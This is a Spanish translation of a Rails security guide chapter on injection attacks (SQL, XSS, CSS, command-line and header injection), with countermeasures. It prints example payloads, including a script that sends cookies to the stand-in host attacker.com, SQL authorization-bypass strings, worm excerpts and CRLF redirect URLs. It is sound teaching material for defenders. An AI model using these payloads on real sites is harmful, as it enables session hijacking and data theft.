# 7- Injection

> Injection es una clase de ataques que introducen código malicioso o parámetros en una aplicación web para ejecutarlo dentro de su contexto de seguridad. Los ejemplos prominentes de la inyección son secuencias de comandos entre sitios \(XSS\) e inyección de SQL.

La inyección es muy complicada, porque el mismo código o parámetro puede ser malicioso en un contexto, pero totalmente inofensivo en otro. Un contexto puede ser un lenguaje de programación, consulta o de programación, el shell o un método Ruby / Rails. Las secciones siguientes cubrirán todos los contextos importantes donde pueden ocurrir ataques de inyección. La primera sección, sin embargo, cubre una decisión arquitectónica en relación con la inyección.

### 7.1 Listas blancas versus listas negras

> Al desinfectar, proteger o verificar algo, prefiera las listas blancas sobre listas negras.

Una lista negra puede ser una lista de direcciones de correo electrónico incorrectas, acciones no públicas o etiquetas HTML incorrectas. Esto se opone a una lista blanca que enumera las buenas direcciones de correo electrónico, acciones públicas, buenas etiquetas HTML y así sucesivamente. Aunque a veces no es posible crear una lista blanca \(en un filtro SPAM, por ejemplo\), prefiera utilizar enfoques de listas blancas:

* Utilice `before_action` `except: [...]` `instead` o `only: [...]` para acciones relacionadas con la seguridad. De esta manera, no olvide activar las comprobaciones de seguridad de las acciones añadidas recientemente.
* Permitir &lt;strong&gt; en lugar de eliminar &lt;script&gt; contra Cross-Site Scripting \(XSS\). Vea a abajo para más detalles.
* No trate de corregir la entrada de usuarios mediante listas negras:
  * Esto hará que el ataque funcione: "`<sc<script>ript>".gsub("<script>", "")`
  * Pero rechazar el input malformada

Las listas blancas son también un buen enfoque contra el factor humano de olvidar algo en la lista negra.

### 7.2 Inyección de SQL

Gracias a los métodos inteligentes, esto no es un problema en la mayoría de las aplicaciones de Rails. Sin embargo, este es un ataque muy devastador y común en las aplicaciones web, por lo que es importante entender el problema.

#### 7.2.1 Introducción

Los ataques de inyección SQL apuntan a influenciar las consultas de la base de datos mediante la manipulación de los parámetros de la aplicación web. Un objetivo popular de los ataques de inyección de SQL es evitar la autorización. Otro objetivo es realizar la manipulación de datos o leer datos arbitrarios. A continuación se muestra un ejemplo de cómo no utilizar datos de entrada del usuario en una consulta:

```ruby
Project.where("name = '#{params[:name]}'")
```

Esto podría estar en un `action` llamado `search` y el usuario puede introducir el nombre de un proyecto que desea encontrar. Si un usuario malintencionado introduce `'OR 1 --`, la consulta SQL resultante será:

```sql
SELECT * FROM projects WHERE name = '' OR 1 --'
```

Los dos guiones empiezan un comentario ignorando todo después de él. Por lo tanto, la consulta devuelve todos los registros de la tabla de proyectos, incluidos los ocultos para el usuario. Esto se debe a que la condición es `true` para todos los registros.

#### 7.2.2 Omisión de la autorización

Por lo general, una aplicación web incluye control de acceso. El usuario introduce sus credenciales de inicio de sesión y la aplicación web trata de encontrar el registro coincidente en la tabla de usuarios. La aplicación concede acceso cuando encuentra un registro. Sin embargo, un atacante puede evitar esta comprobación con la inyección de SQL. A continuación se muestra una consulta de base de datos típica en Rails para encontrar el primer registro en la tabla de usuarios que coincide con los parámetros de credenciales de inicio de sesión suministrados por el usuario.

```ruby
User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")
```

Si un atacante introduce ' OR '1'='1 como nombre y ' OR '2'&gt;'1 como contraseña, la consulta SQL resultante será:

```sql
SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1
```

Esto simplemente encontrará el primer registro en la base de datos y concede acceso a este usuario.

#### 7.2.3 Lectura no autorizada

La instrucción UNION conecta dos consultas SQL y devuelve los datos en un conjunto. Un atacante puede usarlo para leer datos arbitrarios de la base de datos. Tomemos el ejemplo de arriba:

```ruby
Project.where("name = '#{params[:name]}'")
```

Y ahora vamos a inyectar otra consulta utilizando la sentencia UNION:

```sql
') UNION SELECT id,login AS name,password AS description,1,1,1 FROM users --
```

Esto resultará en la siguiente consulta SQL:

```sql
SELECT * FROM projects WHERE (name = '') UNION
  SELECT id,login AS name,password AS description,1,1,1 FROM users --'
```

El resultado no será una lista de proyectos \(porque no hay un proyecto con un nombre vacío\), sino una lista de nombres de usuario y su contraseña. Así que esperamos que haya encriptado las contraseñas en la base de datos! El único problema para el atacante es que el número de columnas tiene que ser el mismo en ambas consultas. Es por eso que la segunda consulta incluye una lista de unos \(1\), que será siempre el valor 1, con el fin de coincidir con el número de columnas en la primera consulta.

Además, la segunda consulta cambia el nombre de algunas columnas con la instrucción AS para que la aplicación web muestre los valores de la tabla de usuario. Asegúrese de actualizar sus Rails a al menos 2.1.1.

#### 7.2.4 Contramedidas

Ruby on Rails tiene un filtro incorporado para caracteres especiales de SQL, que escapará ",", caracteres NULL y saltos de línea.Utilizando `Model.find(id)` o `Model.find_by_something(something)` aplica automáticamente esta contramedida. Para fragmentos, especialmente en condiciones de fragmentos \(`where("...")`\), los métodos `connection.execute()` o `Model.find_by_sql()`, tiene que aplicarse manualmente.

En lugar de pasar una cadena a la opción de condiciones, puede pasar una matriz para desinfectar cadenas viciadas así:

```ruby
Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
```

Como puede ver, la primera parte de la matriz es un fragmento de SQL con signos de interrogación. Las versiones desinfectadas de las variables de la segunda parte de la matriz sustituyen a los signos de interrogación. O puede pasar un hash para el mismo resultado:

```ruby
Model.where(login: entered_user_name, password: entered_password).first
```

La matriz o hash de los formularios sólo está disponible en instancias de modelo. Puedes intentar el `sanitize_sql()` en otro lugar. Haga un hábito pensar en las consecuencias de seguridad cuando se utiliza una cadena externa en SQL.

### 7.3 Scripting entre sitios \(XSS\)

> La más extendida y una de las vulnerabilidades de seguridad más devastadoras en las aplicaciones web es XSS. Este ataque malicioso inyecta código ejecutable del lado del cliente. Rails proporciona métodos auxiliares para evitar estos ataques.

#### 7.3.1 Entry points

Un punto de entrada es una URL vulnerable y sus parámetros donde un atacante puede iniciar un ataque.

Los puntos de entrada más comunes son los mensajes de los post, los comentarios de los usuarios y los libros de visitas, pero los títulos de los proyectos, los nombres de los documentos y las páginas de resultados de búsqueda también han sido vulnerables. Pero la entrada no necesariamente tiene que venir de cuadros de entrada en sitios web, puede estar en cualquier parámetro de URL - obvio, oculto o interno. Recuerde que el usuario puede interceptar cualquier tráfico. Las aplicaciones o los proxies de cliente-sitio facilitan el cambio de solicitudes. También hay otros vectores de ataque como anuncios de banner.

Los ataques XSS funcionan de la siguiente manera: Un atacante inyecta algún código, la aplicación web lo guarda y lo muestra en una página, presentado posteriormente a una víctima. La mayoría de los ejemplos XSS simplemente muestran un cuadro de alerta, pero es más potente que eso. XSS puede robar la cookie, secuestrar la sesión, redirigir a la víctima a un sitio web falso, mostrar anuncios para beneficio del atacante, cambiar elementos en el sitio web para obtener información confidencial o instalar software malicioso a través de agujeros de seguridad en el navegador web.

Durante el segundo semestre de 2007, se registraron 88 vulnerabilidades en navegadores Mozilla, 22 en Safari, 18 en IE y 12 en Opera. El informe de amenazas de Symantec Global Internet Security también documentó 239 vulnerabilidades de complemento de explorador en los últimos seis meses de 2007. Mpack es un framework de ataque muy activo y actualizado que aprovecha estas vulnerabilidades. Para hackers criminales, es muy atractivo aprovechar una vulnerabilidad de SQL-Injection en un framework de aplicaciones web e insertar código malicioso en cada columna de tabla textual. En abril de 2008 más de 510.000 sitios fueron hackeados como este, entre ellos el gobierno británico, las Naciones Unidas, y muchos más altos objetivos.

#### 7.3.2 Inyección de HTML / JavaScript

El lenguaje XSS más común es, por supuesto, JavaScript el más popular del lenguaje de scripts del cliente, a menudo en combinación con HTML. Es esencial escapar de la entrada del usuario.

Aquí está la prueba más directa para comprobar XSS:

```js
<script>alert('Hello');</script>
```

Este código JavaScript simplemente mostrará un cuadro de alerta. Los siguientes ejemplos hacen exactamente lo mismo, sólo que en lugares muy poco comunes:

```js
<img src=javascript:alert('Hello')>
<table background="javascript:alert('Hello')">
```

##### 7.3.2.1 Robo de Cookie

Estos ejemplos no causan ningún daño hasta ahora, así que veamos cómo un atacante puede robar la cookie del usuario \(y así secuestrar la sesión del usuario\). En JavaScript puede utilizar la propiedad `document.cookie` para leer y escribir la cookie del documento. JavaScript aplica la misma política de origen, lo que significa que un script de un dominio no puede acceder a las cookies de otro dominio. La propiedad `document.cookie` contiene la cookie del servidor web de origen. Sin embargo, puede leer y escribir esta propiedad si inserta el código directamente en el documento HTML \(como sucede con XSS\). Inyecte esto en cualquier parte de su aplicación web para ver su propia cookie en la página de resultados:

```js
<script>document.write(document.cookie);</script>
```

Para un atacante, por supuesto, esto no es útil, ya que la víctima verá su propia cookie. El siguiente ejemplo intentará cargar una imagen desde la URL `http://www.attacker.com/` además de la cookie. Por supuesto, esta URL no existe, por lo que el navegador no muestra nada. Pero el atacante puede revisar los archivos de registro de acceso de su servidor web para ver la cookie de la víctima.

```js
<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
```

Los archivos de logs en `www.attacker.com` se leerán así:

```ruby
GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
```

Usted puede mitigar estos ataques \(de la manera obvia\) agregando la flag de httpOnly a las cookies, de modo que document.cookie no pueda ser leído por el Javascript. Sólo se pueden utilizar cookies HTTP de IE v6.SP1, Firefox v2.0.0.5, Opera 9.5, Safari 4 y Chrome 1.0.154. Pero otros navegadores antiguos \(como WebTV e IE 5.5 en Mac\) pueden causar que la página no se cargue. Sin embargo, tenga en cuenta que las cookies seguirán siendo visibles usando Ajax.

##### 7.3.2.2 Destrucción

Con la degradación de páginas web, un atacante puede hacer muchas cosas, por ejemplo, presentar información falsa o atraer a la víctima en el sitio web de los atacantes para robar la cookie, credenciales de inicio de sesión u otros datos confidenciales. La forma más popular es incluir código de fuentes externas por iframes:

```html
<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
```

Esto carga HTML y/o JavaScript arbitrario de una fuente externa y lo incrusta como parte del sitio. Este iframe se toma de un ataque real a sitios italianos legítimos usando el marco de ataque de [Mpack](https://isc.sans.edu/diary/MPack+Analysis/3015). Mpack intenta instalar software malicioso a través de agujeros de seguridad en el navegador web - con mucho éxito, el 50% de los ataques tienen éxito.

Un ataque más especializado podría superponerse a todo el sitio web o mostrar un formulario de inicio de sesión, que se ve igual al original del sitio, pero transmite el nombre de usuario y la contraseña al sitio del atacante. O puede usar CSS y/o JavaScript para ocultar un enlace legítimo en la aplicación web y mostrar otro en su lugar que redirige a un sitio web falso.

Los ataques de inyección reflejados son aquellos en los que la carga útil no se almacena para presentarla a la víctima posteriormente, pero se incluye en la URL. Especialmente los formularios de búsqueda no pueden escapar de la cadena de búsqueda. El siguiente enlace presentaba una página en la que se decía que "George Bush designó a un niño de 9 años para que fuera el presidente ...":

```js
http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1-->
  <script src=http://www.securitylab.ru/test/sc.js></script><!--
```

##### 7.3.2.3 Contramedidas

Es muy importante filtrar entradas maliciosas, pero también es importante escapar de la salida de la aplicación web.

Especialmente para XSS, es importante hacer filtrado de entrada de lista blanca en lugar de lista negra. El filtrado de listas blancas indica los valores permitidos en oposición a los valores no permitidos. Las listas negras nunca están completas.

Imagine que una lista negra elimina "script" de la entrada del usuario. Ahora el atacante inyecta "&lt;scrscriptipt&gt;", y después del filtro, "&lt;script&gt;" permanece. Las versiones anteriores de Rails utilizaron un enfoque de lista negra para el método `strip_tags()`, `strip_links()` y `sanitize()`. Así que este tipo de inyección era posible:

```ruby
strip_tags("some<<b>script>alert('hello')<</b>/script>")
```

Esto devolvió "algunos` <script>alert ('hello')</ script>`", lo que hace que un ataque funcione. Es por eso que un enfoque de lista blanca es mejor, utilizando el método actualizado de Rails 2 `sanitize()`:

```ruby
tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
s = sanitize(user_input, tags: tags, attributes: %w(href title))
```

Esto permite sólo las etiquetas dadas y hace un buen trabajo, incluso contra todo tipo de trucos y etiquetas mal formadas.

Como segundo paso, es una buena práctica escapar de toda la salida de la aplicación, especialmente cuando vuelve a mostrar la entrada del usuario, que no ha sido filtrada por el input \(como en el ejemplo del formulario de búsqueda anterior\). Utilice el método `escapeHTML()` o su método alias `h()` para reemplazar los caracteres de entrada HTML &, ", &lt;y&gt; por sus representaciones no interpretadas en HTML \(`&amp;, &quot;, &lt;, and &gt;`\).

##### 7.3.2.4 Ofuscación y codificación de la inyección

El tráfico de la red se basa sobre todo en el alfabeto occidental limitado, así que las nuevas codificaciones de carácter, tales como Unicode, emergieron, para transmitir caracteres en otros idiomas. Sin embargo, esto también es una amenaza para las aplicaciones web, ya que el código malicioso se puede ocultar en diferentes codificaciones que el navegador puede procesar, pero la aplicación web no. Aquí está un vector de ataque en codificación UTF-8:

```html
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

Este ejemplo muestra un cuadro de mensaje. Sin embargo, será reconocido por el filtro `sanitize()` anterior. Una gran herramienta para ofuscar y codificar cadenas, y así "conocer a su enemigo", es el Hackvertor. El método `sanitize()` de Rails hace un buen trabajo para evitar ataques de codificación.

#### 7.3.3 Ejemplos del Subterráneo

Para entender los ataques de hoy en las aplicaciones web, lo mejor es echar un vistazo a algunos vectores de ataque del mundo real.

Lo que sigue es un extracto del Js.Yamanner@m Yahoo! Gusano del correo. Apareció el 11 de junio de 2006 y fue el primer gusano de interfaz webmail:

```html
<img src='http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'
  target=""onload="var http_request = false;    var Email = '';
  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...
```

Los gusanos explotan un agujero en el filtro HTML/JavaScript de Yahoo, que usualmente filtra todos los objetivos y atributos de carga de las etiquetas \(porque puede haber JavaScript\). El filtro se aplica sólo una vez, sin embargo, por lo que el atributo onload con el código de gusano permanece en su lugar. Este es un buen ejemplo de por qué los filtros de listas negras nunca son completos y por qué es difícil permitir HTML/JavaScript en una aplicación web.

Otro gusano de webmail de prueba de concepto es Nduja, un gusano entre dominios para cuatro servicios de webmail italianos. Encuentre más detalles sobre el trabajo de Rosario Valotta. Ambos gusanos webmail tienen el objetivo de recolectar direcciones de correo electrónico, algo con lo que un hacker criminal podría ganar dinero.

En diciembre de 2006, 34.000 nombres de usuario y contraseñas reales fueron robados en un ataque de phishing de MySpace. La idea del ataque fue crear una página de perfil llamada "`login_home_index_html`", por lo que la URL parecía muy convincente. Un HTML y CSS especialmente diseñados se utilizaron para ocultar el contenido original de MySpace de la página y en su lugar mostrar su propio formulario de inicio de sesión.

### 7.4 Inyección CSS

> CSS Injection es en realidad inyección de JavaScript, porque algunos navegadores \(IE, algunas versiones de Safari y otros\) permiten JavaScript en el CSS. Piense dos veces antes de permitir CSS personalizado en su aplicación web.

La injection de CSS se explica mejor con el conocido gusano Samy de MySpace. Este gusano envió automáticamente una solicitud de amistad a Samy \(el atacante\) simplemente visitando su perfil. Dentro de varias horas tuvo más de un millón de solicitudes de amigos, lo que creó tanto tráfico que MySpace quedó fuera de línea. La siguiente es una explicación técnica de ese gusano.

MySpace bloqueó muchas etiquetas, pero permitió CSS. Así el autor del gusano puso JavaScript en un CSS como este:

```html
<div style="background:url('javascript:alert(1)')">
```

Así que la carga útil está en el atributo de estilo. Pero no hay cotizaciones permitidas en la carga útil, ya que las comillas simples y dobles ya se han utilizado. Pero JavaScript tiene una útil función `eval()` que ejecuta cualquier cadena como código.

```html
<div id="mycode" expr="alert('hah!')" style="background:url('javascript:eval(document.all.mycode.expr)')">
```

La función `eval()` es una pesadilla para los filtros de entrada de la lista negra, ya que permite que el atributo de estilo oculte la palabra "`innerHTML`":

```js
alert(eval('document.body.inne' + 'rHTML'));
```

El siguiente problema para MySpace fue filtrar la palabra "javascript", por lo que el autor utilizó "`java <NEWLINE> script`" para evitar esto:

```html
<div id="mycode" expr="alert('hah!')" style="background:url('java↵ script:eval(document.all.mycode.expr)')">
```

Otro problema para el autor del gusano fueron las fichas de seguridad CSRF. Sin ellos no pudo enviar una solicitud de amistad a través de POST. Lo consiguió enviando un GET a la página justo antes de agregar un usuario y analizar el resultado del token CSRF.

Al final, consiguió un gusano de 4 KB, que se inyectó en su página de perfil.

La propiedad CSS de moz-binding resultó ser otra forma de introducir JavaScript en CSS en navegadores basados en Gecko \(Firefox, por ejemplo\).

#### 7.4.1 Contramedidas

Este ejemplo, otra vez, demostró que un filtro de la lista negra nunca esta completo. Sin embargo, como el CSS personalizado en aplicaciones web es una característica bastante rara, puede ser difícil encontrar un buen filtro CSS de lista blanca. Si desea permitir colores o imágenes personalizadas, puede permitir que el usuario las elija y cree el CSS en la aplicación web. Utilice el método `sanitize()` de Rails como modelo para un filtro CSS de lista blanca, si realmente necesita uno.

### 7.5 Inyección de texto

Si desea proporcionar un formato de texto que no sea HTML \(debido a la seguridad\), utilice un lenguaje de marcado que se convierte en HTML en el lado del servidor. RedCloth es un lenguaje para Ruby, pero sin las debidas precauciones, también es vulnerable a XSS.

Por ejemplo, RedCloth traduce `_test_` a `<em> test <em>`, lo que hace que el texto sea en cursiva. Sin embargo, hasta la versión actual 3.0.4, sigue siendo vulnerable a XSS. Obtenga la nueva versión 4 que eliminó los errores graves. Sin embargo, incluso esa versión tiene algunos errores de seguridad, por lo que las contramedidas siguen aplicándose. Aquí hay un ejemplo para la versión 3.0.4:

```ruby
RedCloth.new('<script>alert(1)</script>').to_html
# => "<script>alert(1)</script>"
```

Utilice la opción `:filter_html` para eliminar `HTML` que no fue creado por el procesador Textile.

```ruby
RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
# => "alert(1)"
```

Sin embargo, esto no filtra todo el HTML, se dejarán algunas etiquetas \(por diseño\), por ejemplo `<a>`:

```ruby
RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
# => "<p><a href="javascript:alert(1)">hello</a></p>"
```

#### 7.5.1 Contramedidas

Se recomienda utilizar RedCloth en combinación con un filtro de entrada de lista blanca, como se describe en las contramedidas contra la sección XSS.

### 7.6 Inyección de Ajax

> Las mismas precauciones de seguridad deben tomarse para las acciones de Ajax como para las "normales". Hay al menos una excepción, sin embargo: La salida tiene que ser escapada en el controlador, si la acción no renderiza una vista.

Si utiliza el complemento `in_place_editor`, o acciones que devuelven una cadena, en lugar de representar una vista, tiene que escapar el valor devuelto en la acción. De lo contrario, si el valor devuelto contiene una cadena XSS, el código malicioso se ejecutará al regresar al navegador. Escapar de cualquier valor de entrada utilizando el método `h()`.

### 7.7 Inyección de Línea de Comando

> Utilice los parámetros de línea de comandos proporcionados por el usuario con precaución.

Si su aplicación tiene que ejecutar comandos en el sistema operativo subyacente, hay varios métodos en Ruby: `exec(command)`, `syscall(command)`, `system(command)` y `command`. Deberá tener especial cuidado con estas funciones si el usuario puede ingresar el comando completo o una parte del mismo. Esto se debe a que en la mayoría de los shells, puede ejecutar otro comando al final del primero, concatenándolos con un punto y coma \(;\) o una barra vertical \(\|\).

Una contramedida es usar el método del `system(command, parameters)` que pasa los parámetros de la línea de comandos de forma segura.

```ruby
system("/bin/echo","hello; rm *")
# prints "hello; rm *" and does not delete files
```

### 7.8 Inyección de cabeceras

Los encabezados HTTP se generan dinámicamente y bajo ciertas circunstancias se puede inyectar la entrada del usuario. Esto puede conducir a la redirección falsa, la división de respuesta XSS o HTTP.

Los encabezados de solicitud HTTP tienen un Referer, User-Agent \(software cliente\) y Cookie, entre otros. Por ejemplo, los encabezados de respuesta tienen un campo Código de estado, Cookie y Ubicación \(URL de destino de redirección\). Todos ellos son suministrados por el usuario y pueden ser manipulados con más o menos esfuerzo. Recuerde escapar de estos campos de cabecera, también. Por ejemplo, cuando muestra el agente de usuario en un área de administración.

Además de eso, es importante saber lo que está haciendo al crear cabeceras de respuesta en parte basadas en la entrada del usuario. Por ejemplo, desea redirigir al usuario de nuevo a una página específica. Para ello, introdujo un campo "referer" en un formulario para redirigir a la dirección dada:

```ruby
redirect_to params[:referer]
```

Lo que ocurre es que Rails pone la cadena en el campo de encabezado Location y envía un estado 302 \(redirect\) al navegador. Lo primero que haría un usuario malintencionado es:

```html
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

Y debido a un error en \(Ruby y\) Rails hasta la versión 2.1.2 \(excluyendola\), un hacker puede inyectar campos de cabecera arbitrarios; Por ejemplo:

```html
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

Tenga en cuenta que "%0d%0a" está codificado en URL para "\ r \ n", que es un retorno de carro y un avance de línea \(CRLF\) en Ruby. Por lo tanto, el encabezado HTTP resultante del segundo ejemplo será el siguiente, porque el segundo campo de encabezado Location sobrescribe el primero.

```html
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

Por lo tanto, los vectores de ataque para Header Injection se basan en la inyección de caracteres CRLF en un campo de encabezado. ¿Y qué podría hacer un atacante con una redirección falsa? Pueden redirigir a un sitio de phishing que se ve igual que el tuyo, pero pide volver a iniciar sesión \(y envía las credenciales de inicio de sesión al atacante\). O podrían instalar software malicioso a través de los agujeros de seguridad del navegador en ese sitio. Rails 2.1.2 escapa de estos caracteres para el campo Location en el método `redirect_to`. Asegúrese de hacerlo usted mismo cuando cree otros campos de encabezado con la entrada del usuario.

#### 7.8.1 División de la respuesta

Si la inyección de encabezado era posible, la división de respuesta podría serlo también. En HTTP, el bloque de encabezado es seguido por dos CRLF y los datos reales \(normalmente HTML\). La idea de dividir la respuesta es inyectar dos CRLF en un campo de encabezado, seguido de otra respuesta con HTML malicioso. La respuesta será:

```html
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html
 
 
HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html
 
 
&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

En ciertas circunstancias esto presentaría el HTML malicioso a la víctima. Sin embargo, esto sólo parece funcionar con conexiones Keep-Alive \(y muchos navegadores están utilizando conexiones de una sola vez\). Pero no puedes confiar en esto. En cualquier caso, se trata de un error grave y debe actualizar su Rails a la versión 2.0.5 o 2.1.2 para eliminar los riesgos de inyección de cabecera \(y, por tanto, de división de la respuesta\).





